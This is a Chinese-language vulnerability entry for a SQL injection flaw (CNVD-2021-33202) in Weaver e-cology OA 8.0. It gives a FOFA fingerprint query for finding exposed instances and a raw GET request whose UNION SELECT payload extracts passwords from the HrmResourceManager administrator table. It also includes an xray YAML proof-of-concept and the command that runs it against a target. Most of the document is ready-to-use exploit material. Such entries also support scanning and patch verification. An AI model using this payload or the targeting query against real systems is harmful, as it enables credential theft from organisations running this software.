# 泛微OA E-Cology LoginSSO.jsp（CNVD-2021-33202） SQL注入漏洞
## 漏洞描述

泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等。 泛微e-cology存在SQL注入漏洞。攻击者可利用该漏洞获取敏感信息。

## 影响版本
```
泛微e-cology 8.0
```

## 网络测绘
```
app="泛微-协同办公OA"
```

## 环境搭建

-
## 漏洞复现

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309200026914.png)



## 数据包
```
GET /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Content-Length: 0

```

## YAML代码
```
name: poc-yaml-ecology-loginsso-cnvd-2021-33202-sql
manual: true
transport: http
set:
  s1: randomInt(8000, 10000)
rules:
  r0:
    request:
      cache: true
      method: GET
      path: /upgrade/detail.jsp/login/LoginSSO.jsp?id=1%20UNION%20SELECT%20password%20as%20id%20from%20HrmResourceManager
    expression: response.status == 200 && response.body.bcontains(b'<BODY>\r\n<pre>\r\n<code>')&& response.body.bcontains(b'</code>\r\n</pre>\r\n</BODY>\r\n</HTML>')
expression: r0()
detail:
  author: klear
  links:
    - https://vuls.info/PeiQi/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20LoginSSO.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CNVD-2021-33202/?h=loginsso





```

## xray调用

```
xray ws --poc poc-yaml-ecology-LoginSSO-CNVD-2021-33202-sql.yml --url xx.xx.xx.xx

```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309200027404.png)


